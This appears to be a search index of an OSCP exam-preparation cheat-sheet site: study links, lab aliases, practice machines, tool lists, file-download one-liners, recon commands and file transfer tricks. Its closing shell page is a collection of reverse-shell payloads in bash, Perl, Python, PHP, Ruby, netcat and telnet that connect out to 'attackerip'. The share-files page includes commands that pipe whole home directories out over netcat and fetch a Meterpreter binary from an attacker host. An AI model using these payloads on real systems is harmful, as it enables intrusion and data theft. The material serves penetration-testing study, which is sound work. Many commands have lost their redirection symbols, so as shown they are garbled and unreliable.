Exploitation, 2 nd Edition","title":"Books"},{"location":"certifications/oscp/_preparation/#shell","text":"https://highon.coffee/blog/reverse-shell-cheat-sheet/ Spawning a TTY Shell: https://netsec.ws/?p=337 ICMP Reverse Shell: https://resources.infosecinstitute.com/icmp-reverse-shell/#gref","title":"Shell"},{"location":"certifications/oscp/_preparation/#payloads","text":"Creating Metasploit Payloads: https://netsec.ws/?p=331","title":"Payloads"},{"location":"certifications/oscp/_preparation/#sites","text":"OSCP Exam Guide , PentestMonkey , Hash Cracking Sites , Privilege Escalation , Practical OSCP Tips/Tricks , Exploit-DB , Low Priv Enum Linux (g0tmi1k) , Default Credentials (open-sez.me) , RTFM online , 0daysecurity master enumeration , how to use vi (for the brave) , GTFO bins (love these), LOL Bins Corelan Buffer Overflow Exploit Part 1 Buffer Overflow Guide by Stefan Molls File Transfer Guide , SQL Auth Bypass , SQL Injection Cheat Sheet , Metasploit Basics , LFI Cheat Sheet , Cold Fusion Cheat Sheet , All The Things Payloads , Ultimate Windows Priv Esc Methods , NFS Attacks , Michael LaSalvia: Path to the OSCP , Rumkin Cyphers , All the Exploit Papers , and OSCP Practical Tips . Movie : Zero Days Audio Books : Deep Work, The Art of Invisibility, Grit, Spam Nation, Red Team: How to think like the enemy, Ghost in the Wires, The Girl With the Dragon Tattoo, and Mastery.","title":"Sites"},{"location":"certifications/oscp/lab-setup/","text":"Lab Setup External Sources Terminator Configuration / Zsh: https://guide.offsecnewbie.com/kali-configuration/terminator-shortcuts CherryTree template: https://guide.offsecnewbie.com/cherrytree-oscp-template Aliases ## ALIASES alias vpn = openvpn /root/pwnshare/VPN/OS-XXXXX-PWK.ovpn alias rdp = rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 alias mapshare = ln -s /mnt/hgfs/Pwn_Share/ /root/pwnshare alias l = ls -la alias webup = python -m SimpleHTTPServer 80 // run tcpdump \u2019 s from VPN interface and to only look at source IP \u2019 s from the other attackers range and with a destination of my assigned IP alias shieldsup = tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r - alias ss = searchsploit $1 alias ssx = searchsploit -x $1 Important Locations / etc / / etc / passwd / etc / fstab / etc / hosts / etc / init . d / usr / sbin Terminator Terminator Scrollback - Ctrl + Shift + O = Vertical split - Ctrl + Shift + E = Horizontal split - Ctrl + Shift + Z = Maximizes - Ctrl + Shift + T = New tab - Ctrl + Shift + C = Copy - Ctrl + Shift + V = Paste Proxychains /etc/proxychains.conf Comment : proxy_dns","title":"Lab Setup"},{"location":"certifications/oscp/lab-setup/#lab-setup","text":"","title":"Lab Setup"},{"location":"certifications/oscp/lab-setup/#external-sources","text":"Terminator Configuration / Zsh: https://guide.offsecnewbie.com/kali-configuration/terminator-shortcuts CherryTree template: https://guide.offsecnewbie.com/cherrytree-oscp-template","title":"External Sources"},{"location":"certifications/oscp/lab-setup/#aliases","text":"## ALIASES alias vpn = openvpn /root/pwnshare/VPN/OS-XXXXX-PWK.ovpn alias rdp = rdesktop -g 85% -u offsec -p PASSWORD_HERE 10.11.14.134 alias mapshare = ln -s /mnt/hgfs/Pwn_Share/ /root/pwnshare alias l = ls -la alias webup = python -m SimpleHTTPServer 80 // run tcpdump \u2019 s from VPN interface and to only look at source IP \u2019 s from the other attackers range and with a destination of my assigned IP alias shieldsup = tcpdump -i tap0 -nnvv src net 10.11.0.0/24 and dst 10.11.0.54 -w - | tee capture.pcap | tcpdump -n -r - alias ss = searchsploit $1 alias ssx = searchsploit -x $1","title":"Aliases"},{"location":"certifications/oscp/lab-setup/#important-locations","text":"/ etc / / etc / passwd / etc / fstab / etc / hosts / etc / init . d / usr / sbin","title":"Important Locations"},{"location":"certifications/oscp/lab-setup/#terminator","text":"Terminator Scrollback - Ctrl + Shift + O = Vertical split - Ctrl + Shift + E = Horizontal split - Ctrl + Shift + Z = Maximizes - Ctrl + Shift + T = New tab - Ctrl + Shift + C = Copy - Ctrl + Shift + V = Paste","title":"Terminator"},{"location":"certifications/oscp/lab-setup/#proxychains","text":"/etc/proxychains.conf Comment : proxy_dns","title":"Proxychains"},{"location":"certifications/oscp/notes/","text":"Notes Networking OSI / TCP / UDP https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models","title":"Notes"},{"location":"certifications/oscp/notes/#notes","text":"","title":"Notes"},{"location":"certifications/oscp/notes/#networking","text":"","title":"Networking"},{"location":"certifications/oscp/notes/#osi-tcp-udp","text":"https://www.pluralsight.com/blog/it-ops/networking-basics-tcp-udp-tcpip-osi-models","title":"OSI / TCP / UDP"},{"location":"certifications/oscp/practice-vulnhub/","text":"Practice Beginner friendly Kioptrix 1 Kioptrix 2 Kioptrix 3 Kioptrix 4 Intermediate Kioptrix 5 Kioptrix 2014 Brainpan 1 MrRobot Vulnix Unknown Complexity FristiLeaks (1.3?) Stapler PwnLab VulnOS Wintermute SickOS1.2 SkyTower Pinky\u2019s Palace /dev/random: scream pWnOS (2.0) Metasploitable 1 Metasploitable 2 Lin.Security Temple of Doom Pinky\u2019s Palace v1 Pinky\u2019s Palace v2 Pinky\u2019s Palace v3 Pinky\u2019s Palace v4 zico2 Nebula Windows Hack The Box Metasploitable 3 - https://github.com/rapid7/metasploitable3/wiki https://github.com/magnetikonline/linuxmicrosoftievirtualmachines /dev/random: Sleepy - https://www.vulnhub.com/entry/devrandom-sleepy,123/ Bobby: 1 - https://www.vulnhub.com/entry/bobby-1,42/","title":"Practice"},{"location":"certifications/oscp/practice-vulnhub/#practice","text":"","title":"Practice"},{"location":"certifications/oscp/practice-vulnhub/#beginner-friendly","text":"","title":"Beginner friendly"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-1","text":"","title":"Kioptrix 1"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-2","text":"","title":"Kioptrix 2"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-3","text":"","title":"Kioptrix 3"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-4","text":"","title":"Kioptrix 4"},{"location":"certifications/oscp/practice-vulnhub/#intermediate","text":"","title":"Intermediate"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-5","text":"","title":"Kioptrix 5"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-2014","text":"","title":"Kioptrix 2014"},{"location":"certifications/oscp/practice-vulnhub/#brainpan-1","text":"","title":"Brainpan 1"},{"location":"certifications/oscp/practice-vulnhub/#mrrobot","text":"","title":"MrRobot"},{"location":"certifications/oscp/practice-vulnhub/#vulnix","text":"","title":"Vulnix"},{"location":"certifications/oscp/practice-vulnhub/#unknown-complexity","text":"","title":"Unknown Complexity"},{"location":"certifications/oscp/practice-vulnhub/#fristileaks-13","text":"","title":"FristiLeaks (1.3?)"},{"location":"certifications/oscp/practice-vulnhub/#stapler","text":"","title":"Stapler"},{"location":"certifications/oscp/practice-vulnhub/#pwnlab","text":"","title":"PwnLab"},{"location":"certifications/oscp/practice-vulnhub/#vulnos","text":"","title":"VulnOS"},{"location":"certifications/oscp/practice-vulnhub/#wintermute","text":"","title":"Wintermute"},{"location":"certifications/oscp/practice-vulnhub/#sickos12","text":"","title":"SickOS1.2"},{"location":"certifications/oscp/practice-vulnhub/#skytower","text":"","title":"SkyTower"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace","text":"","title":"Pinky\u2019s Palace"},{"location":"certifications/oscp/practice-vulnhub/#devrandom-scream","text":"","title":"/dev/random: scream"},{"location":"certifications/oscp/practice-vulnhub/#pwnos-20","text":"","title":"pWnOS (2.0)"},{"location":"certifications/oscp/practice-vulnhub/#metasploitable-1","text":"","title":"Metasploitable 1"},{"location":"certifications/oscp/practice-vulnhub/#metasploitable-2","text":"","title":"Metasploitable 2"},{"location":"certifications/oscp/practice-vulnhub/#linsecurity","text":"","title":"Lin.Security"},{"location":"certifications/oscp/practice-vulnhub/#temple-of-doom","text":"","title":"Temple of Doom"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v1","text":"","title":"Pinky\u2019s Palace v1"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v2","text":"","title":"Pinky\u2019s Palace v2"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v3","text":"","title":"Pinky\u2019s Palace v3"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v4","text":"","title":"Pinky\u2019s Palace v4"},{"location":"certifications/oscp/practice-vulnhub/#zico2","text":"","title":"zico2"},{"location":"certifications/oscp/practice-vulnhub/#nebula","text":"","title":"Nebula"},{"location":"certifications/oscp/practice-vulnhub/#windows","text":"Hack The Box Metasploitable 3 - https://github.com/rapid7/metasploitable3/wiki https://github.com/magnetikonline/linuxmicrosoftievirtualmachines /dev/random: Sleepy - https://www.vulnhub.com/entry/devrandom-sleepy,123/ Bobby: 1 - https://www.vulnhub.com/entry/bobby-1,42/","title":"Windows"},{"location":"certifications/oscp/setup/","text":"","title":"Setup"},{"location":"certifications/oscp/y-Tools/","text":"Tools Targeted Tools https://github.com/rejoinder/oscp-enumeration-script/blob/master/scan.sh https://github.com/Tib3rius/AutoRecon https://github.com/codingo/Reconnoitre https://github.com/RoliSoft/ReconScan https://github.com/jbarcia/TrustedSec/tree/master/recon_scan https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py https://github.com/codingo/OSCP-2/blob/master/BASH/LinuxPrivCheck.sh https://github.com/welchbj/bscan https://github.com/xapax/oscp https://github.com/gajos112/OSCP-2 https://github.com/noraj/OSCP-Exam-Report-Template-Markdown https://github.com/OlivierLaflamme/Cheatsheet-God https://github.com/rewardone/OSCPRepo https://github.com/0x4D31/awesome-oscp https://github.com/rebootuser/LinEnum https://github.com/M4ximuss/Powerless https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 nmap, ncat, tmux, SSH, sparta, gobuster, burp suite, nikto, hydra, enum4linux, rpcclient, snmpwalk, icacls, dotdotpwn, searchsploit, ftp (in general, smtp (in general), linenum.sh , linux exploit suggester , msfvenom, wireshark, and sherlock.ps1 . OSCP Collections http://downloads.kali.org/pwk-kali-vm.7z https://github.com/xapax/oscp Linux Explainshell - http://www.explainshell.com/ Script - Store shell history as a script - https://manpages.debian.org/testing/bsdutils/script.1.en.html Immunity Debugger and Mona. Mona part found at https://github.com/corelan/mona Networking Netcat - Ncat - Wireshark - TCPdump - Enumeration http://0daysecurity.com/penetration-testing/enumeration.html Google dorks Whois Netcraft Recon-ng Password Attacks Hydra - http://sectools.org/tool/hydra/ JTR - https://github.com/magnumripper/JohnTheRipper Medusa - https://en.kali.tools/?p=200 https://crackstation.net/ https://hashkiller.co.uk/ http://md5decrypt.net/en/Ntlm/","title":"Tools"},{"location":"certifications/oscp/y-Tools/#tools","text":"","title":"Tools"},{"location":"certifications/oscp/y-Tools/#targeted-tools","text":"https://github.com/rejoinder/oscp-enumeration-script/blob/master/scan.sh https://github.com/Tib3rius/AutoRecon https://github.com/codingo/Reconnoitre https://github.com/RoliSoft/ReconScan https://github.com/jbarcia/TrustedSec/tree/master/recon_scan https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py https://github.com/codingo/OSCP-2/blob/master/BASH/LinuxPrivCheck.sh https://github.com/welchbj/bscan https://github.com/xapax/oscp https://github.com/gajos112/OSCP-2 https://github.com/noraj/OSCP-Exam-Report-Template-Markdown https://github.com/OlivierLaflamme/Cheatsheet-God https://github.com/rewardone/OSCPRepo https://github.com/0x4D31/awesome-oscp https://github.com/rebootuser/LinEnum https://github.com/M4ximuss/Powerless https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 nmap, ncat, tmux, SSH, sparta, gobuster, burp suite, nikto, hydra, enum4linux, rpcclient, snmpwalk, icacls, dotdotpwn, searchsploit, ftp (in general, smtp (in general), linenum.sh , linux exploit suggester , msfvenom, wireshark, and sherlock.ps1 .","title":"Targeted Tools"},{"location":"certifications/oscp/y-Tools/#oscp-collections","text":"http://downloads.kali.org/pwk-kali-vm.7z https://github.com/xapax/oscp","title":"OSCP Collections"},{"location":"certifications/oscp/y-Tools/#linux","text":"Explainshell - http://www.explainshell.com/ Script - Store shell history as a script - https://manpages.debian.org/testing/bsdutils/script.1.en.html Immunity Debugger and Mona. Mona part found at https://github.com/corelan/mona","title":"Linux"},{"location":"certifications/oscp/y-Tools/#networking","text":"Netcat - Ncat - Wireshark - TCPdump -","title":"Networking"},{"location":"certifications/oscp/y-Tools/#enumeration","text":"http://0daysecurity.com/penetration-testing/enumeration.html Google dorks Whois Netcraft Recon-ng","title":"Enumeration"},{"location":"certifications/oscp/y-Tools/#password-attacks","text":"Hydra - http://sectools.org/tool/hydra/ JTR - https://github.com/magnumripper/JohnTheRipper Medusa - https://en.kali.tools/?p=200 https://crackstation.net/ https://hashkiller.co.uk/ http://md5decrypt.net/en/Ntlm/","title":"Password Attacks"},{"location":"certifications/oscp/cheatsheet/0-cheatsheet/","text":"Cheatsheets Common Ports: http://packetlife.net/media/library/23/common_ports.pdf","title":"Cheatsheets"},{"location":"certifications/oscp/cheatsheet/0-cheatsheet/#cheatsheets","text":"Common Ports: http://packetlife.net/media/library/23/common_ports.pdf","title":"Cheatsheets"},{"location":"certifications/oscp/cheatsheet/download/","text":"Powershell $ p = New - Object System . Net . WebClient $ p . DownloadFile ( http://domain/file C:%homepath%file ) powershell set - executionpolicy unrestricted PS C : . test . ps1 Visual Basic Set args = Wscript . Arguments Url = http://domain/file dim xHttp : Set xHttp = createobject ( Microsoft.XMLHTTP ) dim bStrm : Set bStrm = createobject ( Adodb.Stream ) xHttp . Open GET , Url , False xHttp . Send with bStrm . type = 1 .open .write xHttp.responseBody .savetofile C:%homepath%file , 2 end with cscript test . vbs Perl # !/ usr / bin / perl use LWP :: Simple ; getstore ( http://domain/file , file ); Python #!/usr/bin/python import urllib2 u = urllib2.urlopen( http://domain/file ) localFile = open( local_file , w ) localFile.write(u.read()) localFile.close() Ruby #!/ usr / bin / ruby require net/http Net :: HTTP . start ( www.domain.com ) { | http | r = http . get ( /file ) open ( save_location , wb ) { | file | file . write ( r . body ) } } PHP #!/usr/bin/php ?php $data = @ file ( http://example.com/file ); $lf = local_file ; $fh = fopen ( $lf , w ); fwrite ( $fh , $data [ 0 ]); fclose ( $fh ); ? FTP ftp 127 . 0 . 0 . 1 username password get file exit TFTP tftp - i host GET C : % homepath % file location_of_file_on_tftp_server Bitsadmin bitsadmin / transfer n http : // domain / file c : % homepath % file Wget wget http : // example . com / file SMB net use x : \\ 127 . 0 . 0 . 1 share / user : example . comuserID myPassword Notepad Open notepad Go to file \u2013 open In the File Name box near the bottom, type in the full URL path to your file","title":"Download"},{"location":"certifications/oscp/cheatsheet/download/#powershell","text":"$ p = New - Object System . Net . WebClient $ p . DownloadFile ( http://domain/file C:%homepath%file ) powershell set - executionpolicy unrestricted PS C : . test . ps1","title":"Powershell"},{"location":"certifications/oscp/cheatsheet/download/#visual-basic","text":"Set args = Wscript . Arguments Url = http://domain/file dim xHttp : Set xHttp = createobject ( Microsoft.XMLHTTP ) dim bStrm : Set bStrm = createobject ( Adodb.Stream ) xHttp . Open GET , Url , False xHttp . Send with bStrm . type = 1 .open .write xHttp.responseBody .savetofile C:%homepath%file , 2 end with cscript test . vbs","title":"Visual Basic"},{"location":"certifications/oscp/cheatsheet/download/#perl","text":"# !/ usr / bin / perl use LWP :: Simple ; getstore ( http://domain/file , file );","title":"Perl"},{"location":"certifications/oscp/cheatsheet/download/#python","text":"#!/usr/bin/python import urllib2 u = urllib2.urlopen( http://domain/file ) localFile = open( local_file , w ) localFile.write(u.read()) localFile.close()","title":"Python"},{"location":"certifications/oscp/cheatsheet/download/#ruby","text":"#!/ usr / bin / ruby require net/http Net :: HTTP . start ( www.domain.com ) { | http | r = http . get ( /file ) open ( save_location , wb ) { | file | file . write ( r . body ) } }","title":"Ruby"},{"location":"certifications/oscp/cheatsheet/download/#php","text":"#!/usr/bin/php ?php $data = @ file ( http://example.com/file ); $lf = local_file ; $fh = fopen ( $lf , w ); fwrite ( $fh , $data [ 0 ]); fclose ( $fh ); ?","title":"PHP"},{"location":"certifications/oscp/cheatsheet/download/#ftp","text":"ftp 127 . 0 . 0 . 1 username password get file exit","title":"FTP"},{"location":"certifications/oscp/cheatsheet/download/#tftp","text":"tftp - i host GET C : % homepath % file location_of_file_on_tftp_server","title":"TFTP"},{"location":"certifications/oscp/cheatsheet/download/#bitsadmin","text":"bitsadmin / transfer n http : // domain / file c : % homepath % file","title":"Bitsadmin"},{"location":"certifications/oscp/cheatsheet/download/#wget","text":"wget http : // example . com / file","title":"Wget"},{"location":"certifications/oscp/cheatsheet/download/#smb","text":"net use x : \\ 127 . 0 . 0 . 1 share / user : example . comuserID myPassword","title":"SMB"},{"location":"certifications/oscp/cheatsheet/download/#notepad","text":"Open notepad Go to file \u2013 open In the File Name box near the bottom, type in the full URL path to your file","title":"Notepad"},{"location":"certifications/oscp/cheatsheet/exploits/","text":"MS17-010 (EternalBlue) https://github.com/3ndG4me/AutoBlue-MS17-010","title":"Exploits"},{"location":"certifications/oscp/cheatsheet/exploits/#ms17-010-eternalblue","text":"https://github.com/3ndG4me/AutoBlue-MS17-010","title":"MS17-010 (EternalBlue)"},{"location":"certifications/oscp/cheatsheet/post-exploitation/","text":"uname - a hostname whoami id ifconfig Network Scanning nmap - sn 10 . 0 . 0 . 0 / 24 nmap - A - oA nmap $ targetip nmap - v - p - - sT $ targetip Web Scanning nikto - host $ targetip - port $ targetport . / dirsearch . py - w / usr / share / wordlists / dirbuster / directory - list - 2 . 3 - medium . txt - u $ targetip - e php SMB locate * . nse | grep smb nmap - p 139 , 445 --script=$scriptname $targetip nmap - p 139 , 445 --script=smb-vuln* $targetip enum4linux - a $ targetip smbclient \\\\\\\\$ ip \\\\$ share FTP ftp $ targetip Username : anonymous Password : anything Banner Grabbing nc $ targetip $ port Find Exploit searchsploit - u searchsploit $ multiple $ search $ terms msfconsole search $ searchterm","title":"Post exploitation"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#network-scanning","text":"nmap - sn 10 . 0 . 0 . 0 / 24 nmap - A - oA nmap $ targetip nmap - v - p - - sT $ targetip","title":"Network Scanning"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#web-scanning","text":"nikto - host $ targetip - port $ targetport . / dirsearch . py - w / usr / share / wordlists / dirbuster / directory - list - 2 . 3 - medium . txt - u $ targetip - e php","title":"Web Scanning"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#smb","text":"locate * . nse | grep smb nmap - p 139 , 445 --script=$scriptname $targetip nmap - p 139 , 445 --script=smb-vuln* $targetip enum4linux - a $ targetip smbclient \\\\\\\\$ ip \\\\$ share","title":"SMB"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#ftp","text":"ftp $ targetip Username : anonymous Password : anything","title":"FTP"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#banner-grabbing","text":"nc $ targetip $ port","title":"Banner Grabbing"},{"location":"certifications/oscp/cheatsheet/post-exploitation/#find-exploit","text":"searchsploit - u searchsploit $ multiple $ search $ terms msfconsole search $ searchterm","title":"Find Exploit"},{"location":"certifications/oscp/cheatsheet/share-files/","text":"Over SMB https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py- python impacket - smbserver . py test1 `pwd` smbclient - L local - ip -- no - pass net view \\\\ 10 . 10 . 14 . 9 \\\\ 10 . 10 . 14 . 9 \\ test1 \\ test . exe Over NetCat cat file . txt | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 file . txt Tar over NetCat # Send one file tar cfv - file | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - file1 file2 file3 | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - * . doc | nc 192 . 168 . 1 . 123 34567 # Send this dir and subdirectories tar cfv - * | nc 192 . 168 . 1 . 123 34567 # Send a specified directory tar cfv - important_stuff / | nc 192 . 168 . 1 . 123 34567 # Send a specified directory and maintain absolute dir structure tar cfv - / home / joe | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | tar xfv - GZIP over NetCat tar cfv - file1 file2 file3 | gzip - c | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | gunzip - c | tar xfv - Encrypted Tar over NetCat openssl rand 9999 | shasum tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv - Encrypted Tar over NetCat as Base64 tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv - Pull file using NetCat nc - q0 - l - p 5454 potential_attack_vectors . txt nc 192 . 168 . 100 . 185 5454 potential_attack_vectors . txt Over HTTP python - m SimpleHTTPServer ( new - object System . Net . WebClient ). DownloadFile ( http://10.9.122.8/met8888.exe , C:\\Users\\jarrieta\\Desktop\\met8888.exe ) ( echo - e GET /filename_you_are_moving HTTP/0.9\\r \\n \\r \\n \\ 1 3 cat 0 3 ) 3 / dev / tcp / AttackerIP / 80 \\ | ( read i ; while [ $(echo $i | tr -d \\r ) != ]; \\ do read i ; done; cat) local_filename Over FTP apt - get install python - pyftpdlib python - m pyftpdlib - p 21 OR auxiliary / server / ftp ftp_commands.txt: open 10 . 9 . 122 . 8 anonymous whatever binary get met8888 . exe bye ftp - s : ftp_commands . txt echo open 10 . 9 . 122 . 8 ftp_commands . txt echo anonymous ftp_commands . txt echo password ftp_commands . txt echo binary ftp_commands . txt echo get met8888 . exe ftp_commands . txt echo bye ftp_commands . txt ftp - s : ftp_commands . txt Over TFTP apt - get install atftpd service atftpd start auxiliary / server / tftp pkgmgr / iu : TFTP tftp - i 10 . 9 . 122 . 8 GET met8888 . exe tftp - i 10 . 9 . 122 . 8 PUT met8888 . exe References https://h4ck.co/oscp-journey-exam-lab-prep-tips/","title":"Share files"},{"location":"certifications/oscp/cheatsheet/share-files/#over-smb","text":"https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py- python impacket - smbserver . py test1 `pwd` smbclient - L local - ip -- no - pass net view \\\\ 10 . 10 . 14 . 9 \\\\ 10 . 10 . 14 . 9 \\ test1 \\ test . exe","title":"Over SMB"},{"location":"certifications/oscp/cheatsheet/share-files/#over-netcat","text":"cat file . txt | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 file . txt","title":"Over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#tar-over-netcat","text":"# Send one file tar cfv - file | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - file1 file2 file3 | nc 192 . 168 . 1 . 123 34567 # Send multiple files tar cfv - * . doc | nc 192 . 168 . 1 . 123 34567 # Send this dir and subdirectories tar cfv - * | nc 192 . 168 . 1 . 123 34567 # Send a specified directory tar cfv - important_stuff / | nc 192 . 168 . 1 . 123 34567 # Send a specified directory and maintain absolute dir structure tar cfv - / home / joe | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | tar xfv -","title":"Tar over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#gzip-over-netcat","text":"tar cfv - file1 file2 file3 | gzip - c | nc 192 . 168 . 1 . 123 34567 nc - l - p 34567 | gunzip - c | tar xfv -","title":"GZIP over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#encrypted-tar-over-netcat","text":"openssl rand 9999 | shasum tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv -","title":"Encrypted Tar over NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#encrypted-tar-over-netcat-as-base64","text":"tar cfv - secret_file . * . txt | gzip - c | openssl enc - aes - 256 - cbc - salt - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | nc 10 . 100 . 1 . 27 45678 nc - l - p 45678 | openssl enc - aes - 256 - cbc - d - a - k a8280ba2ebc37d03bb0ffdb097ccdf7d5f56a8cd - md md5 | gunzip - c | tar xfv -","title":"Encrypted Tar over NetCat as Base64"},{"location":"certifications/oscp/cheatsheet/share-files/#pull-file-using-netcat","text":"nc - q0 - l - p 5454 potential_attack_vectors . txt nc 192 . 168 . 100 . 185 5454 potential_attack_vectors . txt","title":"Pull file using NetCat"},{"location":"certifications/oscp/cheatsheet/share-files/#over-http","text":"python - m SimpleHTTPServer ( new - object System . Net . WebClient ). DownloadFile ( http://10.9.122.8/met8888.exe , C:\\Users\\jarrieta\\Desktop\\met8888.exe ) ( echo - e GET /filename_you_are_moving HTTP/0.9\\r \\n \\r \\n \\ 1 3 cat 0 3 ) 3 / dev / tcp / AttackerIP / 80 \\ | ( read i ; while [ $(echo $i | tr -d \\r ) != ]; \\ do read i ; done; cat) local_filename","title":"Over HTTP"},{"location":"certifications/oscp/cheatsheet/share-files/#over-ftp","text":"apt - get install python - pyftpdlib python - m pyftpdlib - p 21 OR auxiliary / server / ftp ftp_commands.txt: open 10 . 9 . 122 . 8 anonymous whatever binary get met8888 . exe bye ftp - s : ftp_commands . txt echo open 10 . 9 . 122 . 8 ftp_commands . txt echo anonymous ftp_commands . txt echo password ftp_commands . txt echo binary ftp_commands . txt echo get met8888 . exe ftp_commands . txt echo bye ftp_commands . txt ftp - s : ftp_commands . txt","title":"Over FTP"},{"location":"certifications/oscp/cheatsheet/share-files/#over-tftp","text":"apt - get install atftpd service atftpd start auxiliary / server / tftp pkgmgr / iu : TFTP tftp - i 10 . 9 . 122 . 8 GET met8888 . exe tftp - i 10 . 9 . 122 . 8 PUT met8888 . exe","title":"Over TFTP"},{"location":"certifications/oscp/cheatsheet/share-files/#references","text":"https://h4ck.co/oscp-journey-exam-lab-prep-tips/","title":"References"},{"location":"certifications/oscp/cheatsheet/shell/","text":"Bash bash - i / dev / tcp / 10 . 0 . 0 . 1 / 8080 0 1 exec / bin / bash 0 0 2 0 0 196 ;exec 196 /dev/tcp/attackerip/4444; sh 196 196 2 196 Create a new descriptor which is assigned to a network node. Then we will read and write to that descriptor (does not work in Debian): exec 5 / dev / tcp / attackerip / 4444 cat 5 | while read line ; do $line 2 5 5; done # or : while read line 0 5 ; do $line 2 5 5; done Banner a HTTP server using Bash: #!/bin/bash exec 3 /dev/tcp/ $1 /80 echo -e Get /simple?se=1 HTTP/1.0\\n 3 cat 3 Perl Unix: perl - e use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );}; perl - MIO - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; Windows perl - MIO - e $c=new IO::Socket::INET(PeerAddr, attackerip:4444 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; # Without IO perl - MIO :: Socket - e $c=new IO::Socket::INET(PeerAddr = 127.0.0.1:1234 );STDIN- fdopen($c,r);$~- fdopen($c,w);system$_ while ; print $ sock eval ( $ sock ) while ( $ sock ||= IO :: Socket :: INET - new ( PeerAddr = 127.0.0.1 , PeerPort = 23666 )) Python python - c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]); PHP php - r $sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 ); ? php $ sock = fsockopen ( 10.0.0.1 , 1234 ) ;exec( /bin/sh -i 3 3 2 3 ); ? Ruby Unix ruby - rsocket - e f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f) ruby - rsocket - e exit if fork;c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end Windows ruby - rsocket - e c=TCPSocket.new( attackerip , 4444 );while(cmd=c.gets);IO.popen(cmd, r ){|io|c.print io.read}end NetCat nc - e / bin / sh 10 . 0 . 0 . 1 1234 nc - c / bin / sh 10 . 0 . 0 . 1 1234 / bin / sh | nc attackerip 4444 rm / tmp / f ; mkfifo / tmp / f ; cat / tmp / f |/ bin / sh - i 2 1 | nc 10 . 0 . 0 . 1 1234 / tmp / f rm - f / tmp / p ; mknod / tmp / p p nc attackerip 4444 0 / tmp / p 2 1 Two connections: nc localhost 1233 | / bin / sh | nc 127 . 0 . 0 . 1 1234 Telnet rm - f / tmp / p ; mknod / tmp / p p telnet attackerip 4444 0 / tmp / p 2 1 telnet attackerip 4444 | / bin / bash | telnet attackerip 4445 # Remember to listen on your machine also on port 4445 / 